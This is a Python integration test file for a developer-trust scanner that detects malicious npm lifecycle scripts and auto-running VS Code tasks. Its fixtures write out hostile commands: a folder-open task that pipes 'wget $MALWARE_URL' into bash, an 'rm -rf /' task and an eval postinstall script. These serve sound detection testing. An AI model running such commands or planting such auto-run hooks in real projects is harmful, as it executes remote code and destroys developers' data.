"""Integration tests for end-to-end pipeline validation."""

import json
import time
from pathlib import Path

from click.testing import CliRunner

from dev_trust_scanner.cli import main
from dev_trust_scanner.core.orchestrator import Orchestrator


class TestEndToEnd:
    """End-to-end integration tests."""

    def test_clean_project_produces_zero_findings(self, clean_npm_package):
        """Test that clean project produces zero findings."""
        orchestrator = Orchestrator()
        result = orchestrator.scan(clean_npm_package)

        assert result.summary["total"] == 0
        assert len(result.findings) == 0
        assert result.summary["critical"] == 0
        assert result.summary["high"] == 0
        assert result.summary["medium"] == 0
        assert result.summary["low"] == 0

    def test_malicious_project_detects_findings(self, malicious_npm_eval):
        """Test that malicious project produces findings."""
        orchestrator = Orchestrator()

        # Test eval detection
        result_eval = orchestrator.scan(malicious_npm_eval)
        assert result_eval.summary["total"] > 0
        # Should detect NPM-001 (eval), NPM-002 (base64), or NPM-ENTROPY
        rule_ids = {f.rule_id for f in result_eval.findings}
        assert "NPM-001" in rule_ids or "NPM-002" in rule_ids

    def test_mixed_project_detects_only_malicious(self, tmp_path):
        """Test project with both clean and malicious files."""
        # Create clean package.json
        clean_pkg = tmp_path / "package.json"
        clean_pkg.write_text(
            json.dumps(
                {"name": "mixed", "scripts": {"test": "jest", "build": "webpack"}}
            )
        )

        # Create malicious VS Code task (avoid http:// due to comment stripper)
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        tasks = vscode_dir / "tasks.json"
        tasks.write_text(
            json.dumps(
                {
                    "version": "2.0.0",
                    "tasks": [
                        {
                            "label": "malicious",
                            "command": "wget $MALWARE_URL -O- | bash",
                            "runOptions": {"runOn": "folderOpen"},
                        }
                    ],
                }
            )
        )

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should detect VS Code issues but not npm issues
        assert result.summary["total"] > 0
        assert any(f.plugin_name == "vscode-tasks" for f in result.findings)
        # npm plugin should run but find nothing in clean scripts
        assert "npm-lifecycle" in result.plugins_run

    def test_monorepo_scans_all_packages(self, npm_monorepo):
        """Test scanning monorepo with multiple packages."""
        orchestrator = Orchestrator()
        result = orchestrator.scan(npm_monorepo)

        # Should find malicious package in pkg2
        assert result.summary["total"] > 0
        assert any("pkg2" in str(f.file_path) for f in result.findings)

        # Verify multiple package.json files were scanned
        scanned_files = {str(f.file_path) for f in result.findings}
        # At least one finding from packages/pkg2
        assert any("packages/pkg2" in f for f in scanned_files)

    def test_contagious_interview_detection(self, contagious_interview_task):
        """Test realistic Contagious Interview attack detection."""
        orchestrator = Orchestrator()
        result = orchestrator.scan(contagious_interview_task)

        # Should detect critical auto-execution
        assert result.summary["critical"] > 0
        assert any(f.rule_id == "VSC-001" for f in result.findings)

        # Should also detect obfuscation and hidden presentation
        assert result.summary["total"] >= 2  # At least VSC-001 + others


class TestCLIIntegration:
    """Test CLI with various output formats."""

    def test_cli_text_output_clean_project(self, clean_npm_package):
        """Test CLI with text output on clean project."""
        runner = CliRunner()
        result = runner.invoke(main, [str(clean_npm_package)])

        assert result.exit_code == 0
        assert "No issues found" in result.output or "0 findings" in result.output

    def test_cli_text_output_malicious_project(self, malicious_npm_eval):
        """Test CLI with text output on malicious project."""
        runner = CliRunner()
        result = runner.invoke(main, [str(malicious_npm_eval)])

        assert result.exit_code == 1  # Findings detected
        assert "NPM-001" in result.output or "eval" in result.output.lower()

    def test_cli_json_output(self, malicious_npm_eval):
        """Test CLI with JSON output format."""
        runner = CliRunner()
        result = runner.invoke(main, [str(malicious_npm_eval), "--format", "json"])

        assert result.exit_code == 1
        # Should be valid JSON
        data = json.loads(result.output)
        assert "findings" in data
        assert "target_path" in data
        assert "plugins_run" in data
        assert len(data["findings"]) > 0

    def test_cli_sarif_output(self, contagious_interview_task):
        """Test CLI with SARIF output format."""
        runner = CliRunner()
        result = runner.invoke(
            main, [str(contagious_interview_task), "--format", "sarif"]
        )

        assert result.exit_code == 1
        # Should be valid SARIF
        data = json.loads(result.output)
        assert data["version"] == "2.1.0"
        assert "$schema" in data
        assert "runs" in data
        assert len(data["runs"]) == 1
        assert len(data["runs"][0]["results"]) > 0

    def test_cli_plugin_filter(self, tmp_path):
        """Test CLI with plugin filter option."""
        # Create project with both npm and vscode issues
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps(
                {"name": "test", "scripts": {"postinstall": "eval(malicious)"}}
            )
        )

        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps(
                {
                    "version": "2.0.0",
                    "tasks": [
                        {
                            "label": "bad",
                            "command": "rm -rf /",
                            "runOptions": {"runOn": "folderOpen"},
                        }
                    ],
                }
            )
        )

        runner = CliRunner()

        # Test npm-only
        result_npm = runner.invoke(
            main, [str(tmp_path), "--plugin", "npm-lifecycle", "--format", "json"]
        )
        data_npm = json.loads(result_npm.output)
        assert all(f["plugin_name"] == "npm-lifecycle" for f in data_npm["findings"])

        # Test vscode-only
        result_vsc = runner.invoke(
            main, [str(tmp_path), "--plugin", "vscode-tasks", "--format", "json"]
        )
        data_vsc = json.loads(result_vsc.output)
        assert all(f["plugin_name"] == "vscode-tasks" for f in data_vsc["findings"])

    def test_cli_verbose_output(self, clean_npm_package):
        """Test CLI verbose flag."""
        runner = CliRunner()

        # Non-verbose (default)
        result_quiet = runner.invoke(main, [str(clean_npm_package)])
        assert "INFO" not in result_quiet.output
        assert "DEBUG" not in result_quiet.output

        # -v (INFO level)
        result_info = runner.invoke(main, [str(clean_npm_package), "-v"])
        # Logging goes to stderr, not captured in output by default
        assert result_info.exit_code == 0

        # -vv (DEBUG level)
        result_debug = runner.invoke(main, [str(clean_npm_package), "-vv"])
        assert result_debug.exit_code == 0

    def test_cli_list_plugins(self):
        """Test CLI list-plugins option."""
        runner = CliRunner()
        result = runner.invoke(main, ["--list-plugins"])

        assert result.exit_code == 0
        assert "npm-lifecycle" in result.output
        assert "vscode-tasks" in result.output


class TestErrorResilience:
    """Test error handling and graceful degradation."""

    def test_malformed_json_does_not_crash(self, malformed_package_json):
        """Test that malformed JSON is handled gracefully."""
        orchestrator = Orchestrator()
        # Should not raise exception
        result = orchestrator.scan(malformed_package_json)

        # Should still complete scan
        assert result is not None
        assert "npm-lifecycle" in result.plugins_run

    def test_empty_directory_scan(self, tmp_path):
        """Test scanning completely empty directory."""
        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        assert result.summary["total"] == 0
        assert len(result.findings) == 0
        # All plugins should still run
        assert len(result.plugins_run) == 3

    def test_non_utf8_content_handling(self, tmp_path):
        """Test handling of binary/non-UTF8 content."""
        # Create package.json with binary content
        pkg = tmp_path / "package.json"
        pkg.write_bytes(b"\x00\x01\x02\x03\xff\xfe\xfd")

        orchestrator = Orchestrator()
        # Should not crash
        result = orchestrator.scan(tmp_path)
        assert result is not None

    def test_very_large_file_skipped(self, tmp_path):
        """Test that files >10MB are skipped."""
        # Create oversized package.json (11MB)
        pkg = tmp_path / "package.json"
        large_content = json.dumps(
            {"name": "huge", "description": "x" * (11 * 1024 * 1024)}
        )
        pkg.write_text(large_content)

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should complete without error
        assert result is not None
        # File should be skipped, no findings
        assert result.summary["total"] == 0


class TestPerformance:
    """Performance and scalability tests."""

    def test_scan_completes_in_reasonable_time(self, tmp_path):
        """Test performance with 100+ files."""
        # Create 100 clean package.json files
        for i in range(100):
            subdir = tmp_path / f"project-{i}"
            subdir.mkdir()
            pkg = subdir / "package.json"
            pkg.write_text(
                json.dumps({"name": f"pkg-{i}", "scripts": {"test": "jest"}})
            )

        orchestrator = Orchestrator()
        start = time.time()
        result = orchestrator.scan(tmp_path)
        duration = time.time() - start

        # Should complete in <5 seconds for 100 files
        assert duration < 5.0
        assert result.summary["total"] == 0  # All clean

    def test_monorepo_performance(self, tmp_path):
        """Test scanning large monorepo structure."""
        # Create monorepo with 50 packages
        root_pkg = tmp_path / "package.json"
        root_pkg.write_text(json.dumps({"name": "monorepo", "workspaces": ["apps/*"]}))

        for i in range(50):
            app_dir = tmp_path / "apps" / f"app-{i}"
            app_dir.mkdir(parents=True)
            (app_dir / "package.json").write_text(
                json.dumps({"name": f"app-{i}", "scripts": {"build": "tsc"}})
            )

        orchestrator = Orchestrator()
        start = time.time()
        result = orchestrator.scan(tmp_path)
        duration = time.time() - start

        # Should complete in reasonable time
        assert duration < 3.0
        assert result.summary["total"] == 0


class TestExitCodes:
    """Test CLI exit codes for CI/CD integration."""

    def test_exit_code_zero_for_clean(self, clean_npm_package):
        """Test exit code 0 for clean scan."""
        runner = CliRunner()
        result = runner.invoke(main, [str(clean_npm_package)])
        assert result.exit_code == 0

    def test_exit_code_one_for_findings(self, malicious_npm_eval):
        """Test exit code 1 for findings detected."""
        runner = CliRunner()
        result = runner.invoke(main, [str(malicious_npm_eval)])
        assert result.exit_code == 1

    def test_exit_code_reflects_severity(self, tmp_path):
        """Test exit code based on finding severity."""
        runner = CliRunner()

        # Create package with low severity issue (NPM-005)
        pkg = tmp_path / "package.json"
        pkg.write_text(
            json.dumps(
                {
                    "name": "test",
                    "scripts": {
                        "postinstall": "rm -rf /tmp/cache"  # File operation - LOW severity
                    },
                }
            )
        )

        result = runner.invoke(main, [str(tmp_path)])
        # Any findings = exit 1
        assert result.exit_code == 1
